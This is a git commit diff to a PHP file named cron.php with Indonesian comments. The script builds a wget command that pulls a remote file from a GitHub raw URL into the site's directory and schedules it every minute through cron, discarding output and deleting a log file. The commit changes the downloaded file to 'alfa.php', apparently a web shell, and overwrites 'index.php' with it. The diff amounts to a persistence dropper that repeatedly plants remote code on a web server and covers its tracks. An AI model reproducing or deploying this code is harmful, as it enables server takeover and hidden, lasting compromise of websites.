07986b89edb36e6531ac9180532506d0248310ed
R10T <85335450+sunshine0110@users.noreply.github.com>
2023-11-23 14:36:26 +0700

    Update cron.php

--- cron.php
+++ cron.php
@@ -1,12 +1,12 @@
 <?php
 // URL yang ingin Anda unduh
-$urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/zxsan/main/crownjob.php';
+$urlToDownload = 'https://raw.githubusercontent.com/sunshine0110/zxsan/main/alfa.php';
 
 // Direktori tempat skrip PHP ini diakses
 $currentDirectory = dirname(__FILE__);
 
 // Buat perintah wget
-$downloadCommand = 'wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($currentDirectory . '/crownjob.php');
+$downloadCommand = 'wget ' . escapeshellarg($urlToDownload) . ' -P ' . escapeshellarg($currentDirectory) . ' -O ' . escapeshellarg($currentDirectory . '/index.php');
 
 // Tugas Cron untuk mengunduh file setiap 30 detik dan kemudian menghapus log
 $downloadCronCommand = '* * * * * ' . $downloadCommand . ' > /dev/null 2>&1 && rm ' . escapeshellarg($currentDirectory . '/logfile.log');
